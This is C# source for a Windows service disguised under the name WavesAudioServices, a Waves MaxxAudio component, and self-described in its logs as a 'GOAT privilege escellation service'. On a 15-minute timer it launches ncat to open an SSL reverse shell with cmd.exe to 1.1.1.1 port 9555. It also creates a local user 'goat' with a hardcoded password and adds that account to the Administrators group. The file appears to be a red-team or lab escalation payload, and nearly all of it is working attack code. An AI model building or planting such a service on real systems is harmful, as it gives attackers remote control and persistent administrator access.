using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Security.Principal;



namespace WavesAudioServices
{
    public partial class WavesAudioServices : ServiceBase
    {

        public WavesAudioServices()
        {
            InitializeComponent();
            eventLog1 = new System.Diagnostics.EventLog();
            if (!System.Diagnostics.EventLog.SourceExists("GoatService"))
            {
                System.Diagnostics.EventLog.CreateEventSource(
                    "GoatService", "GoatLog");
            }
            eventLog1.Source = "GoatService";
            eventLog1.Log = "GoatLog";
        }

        protected override void OnStart(string[] args)
        {
            eventLog1.WriteEntry("GOAT privilege escellation service initializing");

            // Set up a timer to trigger every minute.  
            System.Timers.Timer timer = new System.Timers.Timer();
            timer.Interval = 900000; // 15 minutes 
            timer.Elapsed += new System.Timers.ElapsedEventHandler(this.OnTimer);
            timer.Start();
        }

        protected override void OnStop()
        {
            eventLog1.WriteEntry("Stopping Goat Escellation Service.");
        }

        private void eventLog1_EntryWritten(object sender, EntryWrittenEventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {

        }

        public void OnTimer(object sender, System.Timers.ElapsedEventArgs args)
        {
            // TODO: Insert monitoring activities here.
            try
            {
                eventLog1.WriteEntry("attempting to create a reverse shell via ncat.exe -nv host 1.1.1.1 -e cmd.exe");

                Process p = new Process();
                p.StartInfo.FileName = "C:\\Program Files\\Waves\\MaxxAudio\\ncat.exe";
                p.StartInfo.Arguments = "-nv 1.1.1.1 9555 --ssl -e C:\\Windows\\system32\\cmd.exe";
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.Start();
                string stdout = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                eventLog1.WriteEntry(stdout);
            }
            catch (Exception E)
            {
                eventLog1.WriteEntry(E.Message.ToString());
            }

            try
            {   // This is not "Operationally Safe..."
                eventLog1.WriteEntry("attempting to add local user goat - net user /add goat xxxxxxxxx");

                Process p2 = new Process();
                p2.StartInfo.FileName = "C:\\Windows\\system32\\net.exe";
                p2.StartInfo.Arguments = "user /add goat H3rd1ngG04tz";
                p2.StartInfo.RedirectStandardOutput = true;
                p2.StartInfo.UseShellExecute = false;
                p2.Start();
                string stdout2 = p2.StandardOutput.ReadToEnd();
                p2.WaitForExit();
                eventLog1.WriteEntry(stdout2);
            }
            catch (Exception E)
            {
                eventLog1.WriteEntry(E.Message.ToString());
            }

            try
            {
                eventLog1.WriteEntry("attempting to add local user goat to local administrators group - net localgroup administrators goat /add");
               
                Process p3 = new Process();
                p3.StartInfo.FileName = "C:\\Windows\\system32\\net.exe";
                p3.StartInfo.Arguments = "localgroup administrators /add goat";
                p3.StartInfo.RedirectStandardOutput = true;
                p3.StartInfo.UseShellExecute = false;
                p3.Start();
                string stdout3 = p3.StandardOutput.ReadToEnd();
                p3.WaitForExit();
                eventLog1.WriteEntry(stdout3);
            }
            catch (Exception E)
            {
                eventLog1.WriteEntry(E.Message.ToString());
            }
        }

    }
}
